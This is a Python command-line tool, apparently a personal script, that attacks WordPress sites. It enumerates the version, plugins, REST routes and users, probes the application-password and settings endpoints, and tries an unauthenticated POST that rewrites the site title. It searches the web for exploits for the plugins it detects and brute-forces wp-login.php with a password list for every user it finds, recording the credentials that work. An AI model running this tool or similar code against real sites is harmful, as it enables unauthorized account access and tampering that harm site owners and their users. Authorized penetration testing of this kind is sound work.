import argparse
from colorama import init, Fore
import requests
from selenium import webdriver
from selenium.webdriver import Firefox
from selenium.webdriver.common.by import By
from selenium.webdriver.firefox.options import Options
import time
import os

init(autoreset=True)

wordpress_version_found = []
found_slugs = []
found_plugins = []
found_routes = []
found_users = []
found_creds = []
useful_links = []
results = []


def driver_settings():
    options = Options()
    options.add_argument("--headless")
    driver = webdriver.Firefox(options)
    return driver

headers = { 
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:138.0) Gecko/20100101 Firefox/138.0" 
    }

def target_request(target_url, password_file=None, output_file=None, search=False):
    print(Fore.BLUE + f"[*] Starting scan on {target_url}")
    wordpress_version(target_url)
    r = requests.get(f"{target_url}/wp-json", headers=headers)
    if r.status_code == 200:
        data = r.json()
        print(Fore.GREEN + f"[+] Timezone: {data.get('timezone_string')}")
        print(Fore.BLUE + f"[*] Scanning {target_url} for plugins")
        detect_plugins(data)
        print(Fore.BLUE + f"[*] Scanning {target_url} for Routes")
        scan_routes(target_url, data.get('routes', {}))

        if search:
            check_plugin_cves_nvd()
        if password_file:
            with open(password_file, "r", encoding="utf-8") as f:
                pwds = [p.strip() for p in f]
            print(Fore.BLUE + f"[*] Starting brute force with {len(pwds)} passwords...")
            brute_login_wp(target_url, pwds)
        if output_file:
            writing_work(output_file)
    else:
        print(Fore.RED + f"[-] {target_url} Doesnt Seem to be a Wordpress site!")


def wordpress_version(target_url):
    web_drive = driver_settings()
    web_drive.get(target_url)
    try:
        for meta in web_drive.find_elements(By.NAME, 'generator'):
            if meta:
                wordpress_version_found.append(f"{meta.get_attribute('content')}")
                print(Fore.GREEN + f"[+] Wordpress version {meta.get_attribute('content')}")
            else:
                print(Fore.RED + "[-] Wordpress Version not found!")
    except Exception as e:
        print(Fore.RED + f"[-] Error {e}")
    finally:
        web_drive.quit()

def detect_plugins(response_data):
    try:
        for plugin in response_data.get('namespaces', []):
            found_plugins.append(plugin)
            print(Fore.GREEN + f"[+] Plugin namespace: {plugin}")
            time.sleep(0.60)
    except Exception as e:
        print(Fore.RED + f"[-] Error {e}")

def scan_routes(target_url, routes):
    try:
        for route in routes:
            print(Fore.GREEN + f"[+] Route: {route}")
            found_routes.append(route) 

            if route == '/wp/v2/users': # if the users route is found
                print(Fore.BLUE + "[*] User endpoint found. Enumerating...")
                enumerate_users(target_url)

            if route.startswith('/wp/v2/settings'):
                print(Fore.MAGENTA + "[*] Settings endpoint found. Checking GET...")
                check_get_settings(target_url)

            time.sleep(0.60)
    except Exception as e:
        print(Fore.RED + f"[-] Error {e}")

# checks for the user
def enumerate_users(target_url):
    try:
        target = f"{target_url}/wp-json/wp/v2/users"
        url = requests.get(target, headers=headers)
        if url.status_code == 200:
            users = url.json()
            for user in users:
                user_uid = user.get("id")
                user_username = user.get("slug")
                print(Fore.GREEN + f"[+] Found user ID: {user_uid}, slug: {user_username}")
                found_users.append(f"{user_username}:{user_uid}") # appends the users found
                found_slugs.append(user_username)
                print(Fore.BLUE + "[*] Checking Possible Password Leaks!")
                check_app_passwords(target_url, user_uid)
                time.sleep(0.60)
        else:
            print(Fore.RED + "[-] User enumeration failed.")

    except Exception as e:
        print(Fore.RED + f"[-] Error {e}")

def check_app_passwords(target_url, user_id): # gets called good
    try:
        target = f"{target_url}/wp-json/wp/v2/users/{user_id}/application-passwords"
        url = requests.get(target, headers=headers)
        print(Fore.RED + f"[-] Checked user ID {user_id} - Status: {url.status_code}")
        if url.status_code == 200:
            print(Fore.GREEN + f"[+] Possible app password leak for user ID {user_id}!")
    except Exception as e:
        print(Fore.RED + f'[-] Error {e}')

def check_get_settings(target_url):
    try:
        url = f"{target_url}/wp-json/wp/v2/settings"
        r = requests.get(url, headers=headers)
        print(Fore.RED + f"[-] Settings GET status: {r.status_code}")
        if r.status_code == 200:
            print(Fore.GREEN + "[+] Public settings exposed!")
            print(Fore.WHITE + f"{r.json()}")

            check_post_settings(target_url)

        return print(Fore.YELLOW + "[!] Public settings not exposed!")
    except Exception as e:
        print(Fore.RED + f"[-] Error {e}")

def check_post_settings(target_url):
    try:
        url = f"{target_url}/wp-json/wp/v2/settings"
        payload = {"title": "Z∑r0$um"}
        r = requests.post(url, headers=headers, json=payload)
        if r.status_code in [200, 201]:
            print(Fore.GREEN + f"[+] POST status: {r.status_code} - Writeable settings!")
        else:
            print(Fore.RED + f"[-] POST blocked ({r.status_code})")
    except Exception as e:
        print(Fore.RED + f"[-] Error {e}")

''' need to check whats going on here '''
def check_plugin_cves_nvd():
    print(Fore.BLUE + "[*] Scraping NVD for plugin CVEs...")
    web_drive = driver_settings()
    for plugin in found_plugins:
        print(Fore.CYAN + f"[*] {plugin}")
        web_drive.get(f"https://duckduckgo.com/?t=lm&q={plugin.replace("/", "%2F")}+exploit&ia=web")
        for link in web_drive.find_elements(By.CLASS_NAME, 'eVNpHGjtxRBq_gLOfGDr'):
            print(Fore.GREEN + f"[+] {link.get_attribute('href')}")
            results.append(link.get_attribute("href"))
        import time
        time.sleep(0.60)     
    web_drive.quit()

def brute_login_wp(target_url, password_list):
    login_url = f"{target_url}/wp-login.php"
    for user in found_slugs:
        for pwd in password_list:
            data = {'log': user, 'pwd': pwd.strip()}
            r = requests.post(login_url, data=data, headers=headers, allow_redirects=False)
            if "location" in r.headers and "wp-admin" in r.headers["location"]:
                found_creds.append(f"{user} : {pwd}")
                print(Fore.GREEN + f"[+] VALID LOGIN: {user}:{pwd.strip()}")
                break
            else:
                print(Fore.RED + f"[-] Failed login: {user}:{pwd.strip()}")
                
def writing_work(output_file):
    try:
        with open(f"{output_file}", "w+") as f:
            print(wordpress_version_found)
            f.write("#################\nWordpress Version\n####################\n")
            f.write(f"{wordpress_version_found}" + "\n")

            f.write("#################\nPlugins\n####################\n")
            for plugin in found_plugins:
                f.write(plugin + "\n")

            f.write("#################\nusernames\n####################\n")
            for username in found_users:
                f.write(username + "\n")

            f.write("\n####################\nRoutes\n####################\n")
            for route in found_routes:
                f.write(route + "\n")

            f.write("\n####################\nUseful Links\n####################\n")
            for result in results:
                f.write(f"#####{plugin}\n")
                f.write(result + "\n")

            f.write("\n####################\nPasswords\n####################\n")
            for passwords_found in found_creds:
                f.write(passwords_found)

        print(Fore.GREEN + f"[+] File saved! {output_file}")
    except Exception as e:
        print(Fore.RED + f"[-] Error {e} try /path/to/dir/filename.txt")


def scan_target():
    parser = argparse.ArgumentParser()
    parser.add_argument('-t', '--target', required=True, help='Target site (e.g., https://example.com)')
    parser.add_argument('-s', '--search',action='store_true', help='Search duckduckgo for known plugin expliots')
    parser.add_argument('-f', '--file', required=False, help='Password file for brute force')
    parser.add_argument('-o','--output',required=False, help='output file eg. /path/to/named_file.txt')
    args = parser.parse_args()
    target_request(args.target.rstrip('/'), args.file, args.output, args.search)


if __name__ == '__main__':
    scan_target()